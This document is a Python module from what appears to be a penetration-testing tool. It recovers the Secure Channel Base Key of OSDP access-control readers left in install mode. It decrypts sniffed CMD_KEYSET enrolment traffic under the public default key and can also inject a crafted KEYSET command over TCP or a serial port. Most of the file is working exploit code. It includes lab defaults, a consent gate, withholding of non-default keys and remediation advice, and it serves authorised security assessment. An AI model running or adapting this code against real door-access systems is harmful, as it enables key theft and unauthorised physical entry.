"""ATK-04 install-mode / KEYSET enrolment SCBK extraction (D-01/D-02).

When a PD is left in install mode, its Secure Channel is protected by the known OSDP spec
default SCBK-D, so the SCBK that the CP enrols with ``CMD_KEYSET`` (0x75) is recoverable by
anyone observing the bus: the enrolment command is encrypted under a session key derived
from a key everybody knows. ``run_keyset`` reads that enrolment exchange off the wire and
recovers the enrolled SCBK.

Recovery chain (every input is an observed wire value - nothing is assumed):

1. ``RND.A`` from the install-mode ``CMD_CHLNG`` (``secure_channel.challenge_random``) and
   ``(RND.B, PD cryptogram)`` from ``REPLY_CCRYPT`` (``secure_channel.ccrypt_reply``).
2. The channel is confirmed as SCBK-D when a captured handshake recomputes under the spec
   default via ``secure_channel.uses_scbk_d`` - this is what makes the enrolment readable.
3. The session encryption key is derived exactly as LibOSDP does, reusing
   ``secure_channel.aes_ecb``::

       S-ENC = AES-ECB(SCBK-D, [0x01, 0x82] + RND.A[:6] + 0x00 * 8)

4. The ``CMD_KEYSET`` payload is sent under SCS_17 (MAC + encryption) as AES-128-CBC
   ciphertext followed by a 4-byte MAC. LibOSDP's command IV is the bitwise inverse of the
   running R-MAC, and the initial R-MAC is transmitted in the PD's ``REPLY_RMAC_I`` (0x78),
   so ``IV = NOT(R-MAC)`` is itself read from the wire. Decrypting yields the plaintext
   ``key_type(1) || key_length(1) || key || 0x80 padding``; the enrolled SCBK is read out.
   [VERIFIED empirically against the committed sc-scbkd KEYSET fixture, 2026-10-19.]

Every value a Finding reports is read from / confirmed against the observed exchange; a
no-CMD_KEYSET capture, a channel that does not confirm as SCBK-D, or a payload that does not
decrypt to a well-formed key structure all return ``[]`` - a true negative, never a
fabricated key (flagged-assumption behaviour for this specless edge, authored explicitly).

SAFE-03 (recovered-key display): only the public spec default SCBK-D is ever displayed as a
ready value. If the install channel is SCBK-D but the enrolled key is a non-default (vendor /
production) key, the weakness is still reported HIGH but the recovered bytes are withheld -
interlock never reconstructs-and-displays a production key as a weapon.

Active trigger: when no enrolment is observable, ``trigger_keyset`` injects a ``CMD_KEYSET``
(built with ``codec.encode``, only ever carrying the public spec default SCBK-D) through the
write-capable send/receive seam to try to drive an exchange. Against a secure PD this is
rejected and ``run_keyset`` over the result still returns ``[]`` - no fabricated key.

Import discipline: this module stays importable with the standard library plus the
stdlib-only Phase 3 modules (codec/constants/framer/transport). ``secure_channel`` and the
AES primitive (both pull cryptography), ``typer``, ``report`` and ``safety`` are imported
lazily inside the functions that need them.
"""

from __future__ import annotations

import socket
from collections.abc import Callable, Iterable
from pathlib import Path
from typing import TYPE_CHECKING

from interlock.osdp import codec, constants, framer
from interlock.osdp.codec import OsdpFrame
from interlock.osdp.transport import Direction, TCPTap
from interlock.plugin import Finding, Severity

if TYPE_CHECKING:
    import typer

# Lab defaults: observe in the attacker position and relay to the upstream PD (mirrors sniff);
# the active trigger dials the PD directly. No serial path except through the --physical gate.
_DEFAULT_LISTEN_PORT = 10000
_DEFAULT_UPSTREAM = ("pd", 10000)
_DEFAULT_MAX_FRAMES = 200

# Per-reply read size for the active send/receive injectors (TCP and serial).
_READ_SIZE = 4096

# ATK-04 free-text ATT&CK id (T1212 Exploitation for Credential Access); Phase 5 enriches it.
_TECHNIQUE = "T1212"

# OSDP KEYSET payload: key_type 0x01 = SCBK (set the Secure Channel Base Key). The payload is
# key_type(1) || key_length(1) || key. VERIFIED against the committed sc-scbkd KEYSET fixture.
_KEY_TYPE_SCBK = 0x01

# Secure Channel field sizes (mirror secure_channel): RND.A is 8 bytes, the S-ENC context is
# one AES block, the SCS_17 command trailer is a 4-byte MAC, and the R-MAC / IV are 16 bytes.
_RND_LEN = 8
_MAC_LEN = 4
_BLOCK_LEN = 16

# A send/receive injector for the active trigger: given one crafted frame's bytes it transmits
# them and returns the raw reply bytes (b"" when nothing came back). This is the write-capable
# seam the active path drives; the CLI backs it with a TCP socket to the lab PD or, behind the
# --physical gate, with the single consented serial endpoint.
SendFrame = Callable[[bytes], bytes]


def _derive_s_enc(rnd_a: bytes) -> bytes:
    """Return the install-mode session encryption key S-ENC under SCBK-D, via aes_ecb.

    Reuses ``secure_channel.aes_ecb`` (PyCA) with the exact LibOSDP S-ENC context block, so
    AES is never hand-rolled. Only ``RND.A`` is needed: S-ENC = AES-ECB(SCBK-D, [0x01,0x82] +
    RND.A[:6] + 0x00*8).
    """
    from interlock.osdp.secure_channel import aes_ecb

    context = bytes([0x01, 0x82]) + rnd_a[:6] + b"\x00" * 8
    return aes_ecb(constants.SCBK_D, context)


def _aes_cbc_decrypt(key: bytes, iv: bytes, data: bytes) -> bytes:
    """Return AES-128-CBC(key, iv) decryption of ``data`` using the 03-01 crypto library."""
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    decryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    return decryptor.update(data) + decryptor.finalize()


def recover_scbk(keyset_frame: OsdpFrame, rnd_a: bytes, rmac: bytes) -> bytes | None:
    """Recover the enrolled SCBK from an encrypted ``CMD_KEYSET`` payload, or ``None``.

    Derives S-ENC under SCBK-D from ``rnd_a``, computes the command IV as the bitwise inverse
    of the observed R-MAC, AES-CBC-decrypts the KEYSET ciphertext (the payload minus its
    4-byte MAC trailer), and parses ``key_type || key_length || key || 0x80 padding``. Returns
    the enrolled key bytes only when the plaintext is a well-formed SCBK KEYSET structure with
    valid ISO padding; a wrong ``rnd_a`` / ``rmac`` pair yields garbage that fails the
    structural checks and returns ``None`` (never a fabricated key).
    """
    if len(rnd_a) < _RND_LEN or len(rmac) != _BLOCK_LEN:
        return None
    payload = keyset_frame.data
    if len(payload) <= _MAC_LEN:
        return None
    ciphertext = payload[:-_MAC_LEN]
    if not ciphertext or len(ciphertext) % _BLOCK_LEN != 0:
        return None

    s_enc = _derive_s_enc(rnd_a)
    iv = bytes(b ^ 0xFF for b in rmac)
    plaintext = _aes_cbc_decrypt(s_enc, iv, ciphertext)

    if len(plaintext) < 2 or plaintext[0] != _KEY_TYPE_SCBK:
        return None
    key_length = plaintext[1]
    if not 1 <= key_length <= len(plaintext) - 2:
        return None
    key = plaintext[2 : 2 + key_length]
    tail = plaintext[2 + key_length :]
    # OSDP SC padding is ISO/IEC 9797-1 method 2: a 0x80 byte then 0x00 fill (or an exact fit).
    if tail and (tail[0] != 0x80 or any(tail[1:])):
        return None
    return key


def run_keyset(
    frames: Iterable[tuple[Direction, OsdpFrame]],
    *,
    technique: str = _TECHNIQUE,
) -> list[Finding]:
    """Recover the enrolled SCBK from an observed install-mode KEYSET exchange.

    Locates every ``CMD_KEYSET`` (0x75) command, confirms the install channel is SCBK-D by
    recomputing a captured CHLNG/CCRYPT handshake under the spec default
    (``secure_channel.uses_scbk_d``), and - for each SCBK-D-confirming ``RND.A`` and each
    observed R-MAC (from ``REPLY_RMAC_I``) - decrypts the KEYSET payload and reads the enrolled
    key (all-pairs, robust to the lab's deterministic-RNG handshake-restart misalignment).
    Emits one HIGH ``Finding`` naming the recovered key (SAFE-03: the bytes are shown only when
    the key is the public spec default SCBK-D; a non-default key is reported but withheld). An
    absent CMD_KEYSET, an unconfirmable channel, or a payload that does not decrypt to a
    well-formed key all return ``[]`` - a true negative, never a fabricated key.
    """
    from interlock.osdp.secure_channel import ccrypt_reply, challenge_random, uses_scbk_d

    items = list(frames)
    keyset_frames = [
        frame
        for direction, frame in items
        if direction is Direction.cp_to_pd and frame.code == constants.CMD_KEYSET
    ]
    if not keyset_frames:
        return []

    challenge_randoms = [
        rnd_a
        for direction, frame in items
        if (rnd_a := challenge_random(direction, frame)) is not None
    ]
    replies = [
        reply for direction, frame in items if (reply := ccrypt_reply(direction, frame)) is not None
    ]
    rmacs = [
        frame.data[:_BLOCK_LEN]
        for direction, frame in items
        if direction is Direction.pd_to_cp
        and frame.code == constants.REPLY_RMAC_I
        and len(frame.data) >= _BLOCK_LEN
    ]

    # Only an SCBK-D-confirmed channel is readable: the enrolment is protected by a key we know.
    confirmed_rnd_as = [
        rnd_a
        for rnd_a in challenge_randoms
        if any(uses_scbk_d(rnd_a, rnd_b, cryptogram) for rnd_b, cryptogram in replies)
    ]
    if not confirmed_rnd_as or not rmacs:
        return []

    for keyset_frame in keyset_frames:
        for rnd_a in confirmed_rnd_as:
            for rmac in rmacs:
                key = recover_scbk(keyset_frame, rnd_a, rmac)
                if key is not None:
                    return [_recovery_finding(key, technique)]
    return []


def _recovery_finding(key: bytes, technique: str) -> Finding:
    """Build the ATK-04 Finding, honouring the SAFE-03 recovered-key display rule."""
    is_spec_default = key == constants.SCBK_D
    if is_spec_default:
        key_evidence = (
            f"the recovered SCBK is the public OSDP spec default SCBK-D ({key.hex()})"
        )
    else:
        # SAFE-03: a non-default (vendor / production) key is recovered but never displayed.
        key_evidence = (
            f"a {len(key)}-byte SCBK was recovered; its value is withheld (SAFE-03 - not the "
            "public spec default, so it is not displayed)"
        )
    return Finding(
        id="ATK-04-keyset",
        title="OSDP install-mode KEYSET enrolment exposes the Secure Channel Base Key",
        severity=Severity.HIGH,
        evidence=(
            "The install-mode Secure Channel is protected by the known spec default SCBK-D "
            "(confirmed by recomputing the CHLNG/CCRYPT handshake via AES-128-ECB, not a "
            "heuristic), so the key enrolled over CMD_KEYSET (0x75) is readable by any bus "
            f"observer: {key_evidence}. The payload was decrypted with the session key "
            "derived from SCBK-D and the R-MAC read from REPLY_RMAC_I."
        ),
        attack_technique=technique,
        remediation=(
            "Do not leave readers in install mode on the production bus; after enrolment, "
            "provision a unique per-site SCBK and disable install mode so the default SCBK-D "
            "no longer protects (and exposes) the key-set exchange."
        ),
    )


def craft_keyset(address: int, key: bytes = constants.SCBK_D) -> OsdpFrame:
    """Craft one cp->pd ``CMD_KEYSET`` frame for the active trigger (encoded via codec.encode).

    The reply flag is cleared from ``address`` (this is a command CP->PD); the payload is
    ``key_type(SCBK) || key_length || key``. ``key`` defaults to the public spec default SCBK-D
    and SHOULD never be a vendor/production key (SAFE-03): the trigger only ever offers the
    already-public default. Raises ``ValueError`` for an out-of-range address.
    """
    if not 0x00 <= address <= 0x7F:
        raise ValueError(f"address {address:#04x} is outside the OSDP range 0x00..0x7F")
    data = bytes([_KEY_TYPE_SCBK, len(key)]) + key
    return OsdpFrame(
        had_mark=True,
        address=address & ~constants.ADDR_REPLY_FLAG,
        control=0x04,  # CRC trailer, sequence 0 - the clear-text framing codec.encode expects
        scb=b"",
        code=constants.CMD_KEYSET,
        data=data,
        use_crc=True,
    )


def trigger_keyset(seam: SendFrame, address: int, *, key: bytes = constants.SCBK_D) -> bytes:
    """Inject a ``CMD_KEYSET`` through the write-capable ``seam`` and return the raw reply.

    Builds the command with ``codec.encode`` (never hand-assembled bytes) carrying only the
    public spec default SCBK-D, transmits it through the injector, and returns whatever the PD
    replies (``b""`` when nothing came back). Against a secure PD this is rejected, so a
    subsequent ``run_keyset`` over the framed reply still yields no key (true negative).
    """
    return seam(codec.encode(craft_keyset(address, key)))


def keyset_observe_lab(
    target_port: int,
    upstream: tuple[str, int],
    *,
    max_frames: int = _DEFAULT_MAX_FRAMES,
) -> list[Finding]:
    """Drive the read-only ``TCPTap`` against the lab bus and recover from an observed KEYSET.

    Observes one bridged CP<->PD session, decodes up to ``max_frames`` frames with the same
    collector sniff uses, and folds them with ``run_keyset``. Read-only pass-through only
    (SAFE-01): the tap forwards the exact bytes it reads and observes a copy.
    """
    from interlock.osdp.attacks.sniff import decode_chunks

    tap = TCPTap(target_port, upstream)
    frames = decode_chunks(tap.observe(), max_frames=max_frames)
    return run_keyset(frames)


def keyset_active_lab(
    host: str,
    port: int,
    address: int,
    *,
    max_frames: int = _DEFAULT_MAX_FRAMES,
) -> list[Finding]:
    """Inject a ``CMD_KEYSET`` to trigger enrolment, then recover from the framed reply.

    Dials the PD directly (interlock as CP), injects a ``CMD_KEYSET`` via a TCP send/receive
    seam, frames and decodes the reply under a ``DecodeError`` guard, and folds it with
    ``run_keyset``. Against a secure PD the trigger is rejected and this returns ``[]`` (true
    negative, never a fabricated key). The real-port path is reached only through --physical.
    """
    reply = trigger_keyset(_socket_send_frame(host, port), address)
    collected: list[tuple[Direction, OsdpFrame]] = []
    for raw in framer.iter_frames(reply):
        try:
            collected.append((Direction.pd_to_cp, codec.decode(raw)))
        except codec.DecodeError:
            pass  # trailer-valid but structurally malformed; skip, never crash
        if len(collected) >= max_frames:
            break
    return run_keyset(collected)


def _socket_send_frame(host: str, port: int, *, timeout: float = 2.0) -> SendFrame:
    """Return a ``SendFrame`` backed by a fresh TCP connection to the PD per injected frame.

    Each call dials the PD, sends the crafted frame, reads one reply within ``timeout``, and
    closes the socket. Returns ``b""`` if the connection or read fails, so one dead target
    never aborts the trigger.
    """

    def send(frame_bytes: bytes) -> bytes:
        try:
            with socket.create_connection((host, port), timeout=timeout) as sock:
                sock.settimeout(timeout)
                sock.sendall(frame_bytes)
                try:
                    return sock.recv(_READ_SIZE)
                except OSError:
                    return b""
        except OSError:
            return b""

    return send


def _serial_exchange(endpoint: object, frame_bytes: bytes) -> bytes:
    """Write one crafted frame to a pyserial endpoint and read one reply (active --physical).

    Kept tiny and dependency-light so the module imports with no pyserial at module scope;
    ``endpoint`` is the ``serial.Serial`` returned by the consented ``open_physical_endpoint``.
    """
    endpoint.write(frame_bytes)  # type: ignore[attr-defined]
    return bytes(endpoint.read(_READ_SIZE))  # type: ignore[attr-defined]


def register(app: typer.Typer) -> None:
    """Attach the ``keyset`` subcommand to the ``osdp`` Typer group."""
    import typer

    from interlock import report

    @app.command("keyset")
    def keyset(
        mode: str = typer.Option(
            "observe",
            "--mode",
            help="observe = recover from an enrolment already on the bus (lab-safe default); "
            "active = inject CMD_KEYSET to trigger enrolment, then recover.",
        ),
        port: int = typer.Option(
            _DEFAULT_LISTEN_PORT,
            "--port",
            help="Observe: local TCP port to listen on (attacker position, lab default).",
        ),
        upstream_host: str = typer.Option(
            _DEFAULT_UPSTREAM[0],
            "--upstream-host",
            help="Upstream PD host (observe relay target / active trigger target).",
        ),
        upstream_port: int = typer.Option(
            _DEFAULT_UPSTREAM[1],
            "--upstream-port",
            help="Upstream PD port.",
        ),
        pd_address: int = typer.Option(
            101,
            "--address",
            help="PD address to target for the active trigger.",
        ),
        max_frames: int = typer.Option(
            _DEFAULT_MAX_FRAMES,
            "--max-frames",
            help="Stop after decoding this many frames.",
        ),
        physical: bool = typer.Option(
            False,
            "--physical",
            help="Active trigger against a REAL serial port, behind the SAFE-02 consent gate.",
        ),
        device: str = typer.Option(
            "",
            "--device",
            help="Serial device path for --physical (e.g. /dev/ttyUSB0).",
        ),
        target: str = typer.Option(
            "",
            "--target",
            help="Scope identifier you are authorized to assess (required for --physical).",
        ),
        output: Path = typer.Option(
            Path("interlock-report.md"),
            "--output",
            "-o",
            help="Path to write the Markdown report to.",
        ),
    ) -> None:
        """Recover an install-mode enrolled SCBK from a KEYSET exchange (observe by default)."""
        if mode not in ("observe", "active"):
            raise typer.BadParameter("--mode must be 'observe' or 'active'")

        if mode == "observe":
            if physical:
                raise typer.BadParameter("--physical applies to --mode active only")
            findings = keyset_observe_lab(
                port, (upstream_host, upstream_port), max_frames=max_frames
            )
        elif physical:
            # The ONLY real-port path: SAFE-02 consent gate before any byte is transmitted.
            from interlock.osdp.attacks import safety

            if not device or not target:
                raise typer.BadParameter("--physical requires both --device and --target")
            endpoint = safety.open_physical_endpoint(device, target)
            try:
                reply = trigger_keyset(
                    lambda data: _serial_exchange(endpoint, data), pd_address
                )
            finally:
                endpoint.close()
            collected: list[tuple[Direction, OsdpFrame]] = []
            for raw in framer.iter_frames(reply):
                try:
                    collected.append((Direction.pd_to_cp, codec.decode(raw)))
                except codec.DecodeError:
                    pass
            findings = run_keyset(collected)
        else:
            findings = keyset_active_lab(
                upstream_host, upstream_port, pd_address, max_frames=max_frames
            )

        if not findings:
            typer.echo(
                "No SCBK recovered - no install-mode KEYSET exchange under the spec default "
                "SCBK-D was observed (or the active trigger did not elicit one)."
            )
        report.render_terminal(findings)
        report.write_markdown(findings, path=output)
        typer.echo(f"Wrote report to {output}")
